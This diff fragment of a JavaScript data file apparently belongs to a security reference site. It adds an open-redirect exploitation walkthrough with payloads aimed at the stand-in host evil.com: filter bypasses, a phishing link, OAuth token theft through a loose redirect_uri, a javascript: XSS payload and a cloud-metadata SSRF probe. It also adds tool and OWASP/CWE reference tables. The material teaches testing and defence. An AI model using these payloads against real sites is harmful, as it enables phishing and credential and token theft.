+              { label: "1. Find redirect parameters and test the raw case", cmd: "# common names: next, url, return, returnTo, redirect, dest, callback, continue\nhttps://target/login?next=https://evil.com\n# follow the response: a 3xx Location: https://evil.com = open redirect" },
+              { label: "2. Defeat naive filters", cmd: "//evil.com                      # protocol-relative (no scheme to block)\nhttps:/\\evil.com                # backslash confuses parsers\nhttps://target.com@evil.com      # everything before @ is userinfo -> lands on evil.com\nhttps://target.com.evil.com      # suffix trick vs endsWith('target.com')\n/%2f/evil.com   /\\/evil.com      # encoded / mixed slashes normalise oddly" },
+              { label: "3. Weaponise for phishing", cmd: "# a link on the trusted domain that silently lands on your page:\nhttps://target.com/login?next=https://evil-login.com\n# victims trust the visible target.com host" },
+              { label: "4. Chain to OAuth token/code theft", cmd: "# if redirect_uri isn't exact-matched, point it at your host:\nhttps://target/oauth/authorize?client_id=..&redirect_uri=https://evil.com&response_type=token\n# the access token / auth code is delivered to evil.com" },
+              { label: "5. Chain to XSS / SSRF where the scheme is honoured", cmd: "?next=javascript:alert(document.domain)   # if used in a sink -> XSS\n?url=http://169.254.169.254/latest/meta-data/   # server-side follow -> SSRF" }
+            ]
+          },
           {
             title: "Common Bypasses",
             type: "table",
@@ -720,14 +932,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Phishing credibility", "A link on the trusted domain that lands on an attacker page"],
-              ["OAuth/token leakage", "A loose redirect_uri leaks the auth code or access token"],
-              ["Chained exploitation", "Escalate to SSRF, XSS (javascript: / data:), or filter bypass"],
-              ["Cookie/session leakage", "Redirect through a logging endpoint that captures the URL"]
+              ["1", "Find a user-controlled redirect param", "Candidate open redirect"],
+              ["2", "Bypass any weak validation", "Redirect to attacker host confirmed"],
+              ["3", "Phish under the trusted domain", "Credential capture"],
+              ["4", "Or abuse a loose redirect_uri", "OAuth token / code theft"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite", "Test redirect params and filter bypasses"],
+              ["OpenRedireX", "Automated open-redirect fuzzing with payload lists"],
+              ["gau / waybackurls", "Harvest URLs with redirect parameters to test"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "CWE-601 — Open Redirect", url: "https://cwe.mitre.org/data/definitions/601.html" },
+              { label: "OWASP — Unvalidated Redirects and Forwards Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" }
             ]
           },
           {
